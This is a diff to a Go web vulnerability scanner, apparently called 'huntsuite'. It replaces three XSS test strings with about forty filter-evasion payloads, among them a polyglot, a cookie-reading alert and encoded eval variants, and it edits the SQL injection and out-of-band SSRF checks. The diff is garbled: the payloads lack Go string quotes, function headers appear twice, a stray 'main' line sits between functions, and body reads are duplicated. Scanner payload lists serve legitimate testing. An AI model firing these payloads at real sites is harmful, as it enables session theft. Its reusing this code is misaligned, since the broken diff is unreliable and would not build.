@@ -11,9 +11,7 @@ import (
 	"net/http"
 	"net/url"
 	"sort"
-	"io"
 	"net/http"
-	"net/url"
 	"strings"
 	"time"
 
@@ -91,6 +89,7 @@ func (e *Engine) Run(ctx context.Context, opts Options) error {
 	}()
 
 	e.logger.Info("scan started", logging.Fields{"scan_id": scanID, "target": opts.Target})
+
 	injectionPoints, err := e.enumerateInjectionPoints(ctx, scanID, parsed, opts)
 	if err != nil {
 		e.logger.Warn("parameter discovery failed", logging.Fields{"error": err})
@@ -144,10 +143,46 @@ func (e *Engine) runXSS(ctx context.Context, scanID int64, points []injectionPoi
 func (e *Engine) runXSS(ctx context.Context, scanID int64, target *url.URL, opts Options) ([]Finding, error) {
 	e.logger.Info("running xss scanner", logging.Fields{})
 	payloads := []string{
-		`<script>alert(1)</script>`,
-		`"><script>alert('huntsuite')</script>`,
-		`'><script>alert(1)</script>`,
-	}
+	<script>alert(1)</script>,
+	"><script>alert('huntsuite')</script>,
+	'><script>alert(1)</script>,
+	<sCrIpT>alert(1)</ScRiPt>,
+	<img src=x onerror=alert(1)>,
+	<svg onload=alert(1)>,
+	"><img src=x onerror=alert(1)>,
+	'><svg/onload=alert('huntsuite')>,
+	"onmouseover="alert(1),
+	javascript:alert(1),
+	#<img src=x onerror=alert(1)>,
+	?redir=javascript:alert(1),
+	<script>document.write(location.hash.slice(1))</script>,
+	<div id="output"></div><script>output.innerHTML = decodeURIComponent(location.search.slice(1))</script>,
+	<img src=1 onerror=alert(document.cookie)>,
+	<scr<script>ipt>alert(1)</scr</script>ipt>,
+	<iframe src=java&Tab;script:alert(1)>,
+	<svg/onload=alert&lpar;1&rpar;>,
+	<img src=x onerror=alert\1`>, 
+  ,jaVasCript:/*-/*`/*`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>`,
+  <img src=x onerror=alert + "1>",
+	<iframe src=java%09script:alert(1)>,
+	<object data=java%0ascript:alert(1)>,
+	<svg><script>alert&#40;1&#41;</script>,
+	<details open ontoggle=alert(1)>,
+	<marquee onstart=alert(1)>,
+	<math href="javascript:alert(1)">CLICK,
+	<body onpageshow=alert(1)>,
+	<input onfocus=alert(1) autofocus>,
+	<select onfocus=alert(1) autofocus>,
+	<textarea onfocus=alert(1) autofocus>,
+	<keygen onfocus=alert(1) autofocus>,
+	<video><source onerror=alert(1)>,
+	<audio src=x onerror=alert(1)>,
+	<form><button formaction=javascript:alert(1)>X,
+	<isindex type=image src=1 onerror=alert(1)>,
+	<svg><animate onbegin=alert(1) attributeName=x dur=1s>,
+	<svg/onload=setTimeout + "alert\\x281\\x29>",
+	<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>,
+}
 
 	var findings []Finding
 
@@ -454,6 +489,8 @@ func (e *Engine) runSQLi(ctx context.Context, scanID int64, target *url.URL, opt
 				e.logger.Warn("sql injection finding", logging.Fields{"parameter": param, "vector": "time-based", "duration": duration})
 				findings = append(findings, f)
 				if err := e.persistFinding(ctx, scanID, f); err != nil {
+
+
 					e.logger.Warn("persist finding failed", logging.Fields{"error": err})
 				}
 				break
@@ -470,6 +507,7 @@ func (e *Engine) runSQLi(ctx context.Context, scanID int64, target *url.URL, opt
 func (e *Engine) runSSRF(ctx context.Context, scanID int64, points []injectionPoint, opts Options) ([]Finding, error) {
 	e.logger.Info("running ssrf scanner", logging.Fields{"surface": len(points)})
 	if opts.OOBDomain == "" {
+
 func (e *Engine) runSSRF(ctx context.Context, scanID int64, target *url.URL, opts Options) ([]Finding, error) {
 	e.logger.Info("running ssrf scanner", logging.Fields{})
 	baseParams := target.Query()
@@ -478,7 +516,6 @@ func (e *Engine) runSSRF(ctx context.Context, scanID int64, target *url.URL, opt
 	}
 
 	var findings []Finding
-  
 	for _, point := range points {
 		if err := ctx.Err(); err != nil {
 			return findings, err
@@ -526,6 +563,7 @@ func (e *Engine) runSSRF(ctx context.Context, scanID int64, target *url.URL, opt
 		if err := e.persistFinding(ctx, scanID, finding); err != nil {
 			e.logger.Warn("persist finding failed", logging.Fields{"error": err})
 		}
+
 	for param := range baseParams {
 		mutated := cloneQuery(baseParams)
 		mutated.Set(param, fmt.Sprintf("http://%s", opts.OOBDomain))
@@ -784,6 +822,8 @@ func (e *Engine) sendAndEvaluate(ctx context.Context, scanID int64, method, targ
 		return nil, err
 	}
 	defer resp.Body.Close()
+
+	body, err := io.ReadAll(io.LimitReader(resp.Body, maxResponseBodyBytes))
   
 	body, err := io.ReadAll(io.LimitReader(resp.Body, maxResponseBodyBytes))
 	body, err := io.ReadAll(resp.Body)
@@ -796,7 +836,7 @@ func (e *Engine) sendAndEvaluate(ctx context.Context, scanID int64, method, targ
 			e.logger.Debug("failed to persist response", logging.Fields{"error": err})
 		}
 	}
-  
+
 	return &responsePayload{
 		StatusCode: resp.StatusCode,
 		Headers:    cloneHeader(resp.Header),
@@ -826,6 +866,7 @@ func (e *Engine) measureLatency(ctx context.Context, scanID int64, template requ
 		return 0, fmt.Errorf("no samples recorded")
 	}
 	return total / time.Duration(count), nil
+
 	matched, evidence := evaluator(body)
 	if matched {
 		return &evaluationResult{Evidence: evidence}, nil
@@ -862,6 +903,7 @@ func (e *Engine) persistFinding(ctx context.Context, scanID int64, finding Findi
 	})
 	return err
 }
+main
 func detectXSS(resp *responsePayload, payload string) (bool, string) {
 	if resp == nil {
 		return false, ""
@@ -984,6 +1026,7 @@ func escapeShellArg(arg string) string {
 }
 
 func cloneValues(q url.Values) url.Values {
+
 func (e *Engine) timeRequest(ctx context.Context, scanID int64, target *url.URL, params url.Values, param, value string, opts Options) (time.Duration, error) {
 	mutated := cloneQuery(params)
 	mutated.Set(param, value)
@@ -999,6 +1042,7 @@ func (e *Engine) timeRequest(ctx context.Context, scanID int64, target *url.URL,
 }
 
 func cloneQuery(q url.Values) url.Values {
+
 	cloned := make(url.Values, len(q))
 	for k, v := range q {
 		cp := make([]string, len(v))
@@ -1007,6 +1051,7 @@ func cloneQuery(q url.Values) url.Values {
 	}
 	return cloned
 }
+
 func cloneURL(u *url.URL) *url.URL {
 	if u == nil {
 		return nil
@@ -1036,7 +1081,9 @@ func headerJSON(h http.Header) string {
 	if h == nil {
 		return "{}"
 	}
+
 func headerJSON(h http.Header) string {
+
 	buf, _ := json.Marshal(h)
 	return string(buf)
 }
